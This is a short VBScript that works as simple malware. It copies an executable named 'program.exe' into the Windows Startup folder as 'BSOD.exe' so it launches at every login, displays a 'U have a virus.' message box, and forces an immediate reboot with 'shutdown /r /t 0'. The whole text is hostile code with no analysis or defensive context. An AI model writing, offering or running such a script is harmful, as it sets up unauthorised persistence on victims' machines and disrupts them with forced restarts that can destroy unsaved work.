Set WShell = CreateObject("WScript.Shell")
Set FSO = CreateObject("Scripting.FilesystemObject")
Startup = WShell.ExpandEnvironmentStrings("%APPDATA%")&"\Microsoft\Windows\Start Menu\Programs\Startup\"
FSO.CopyFile "./program.exe", Startup&"BSOD.exe", True
x=MsgBox("U have a virus.",vbOKOnly+vbCritical,"Mr. Virus")
WShell.Run "shutdown /r /t 0"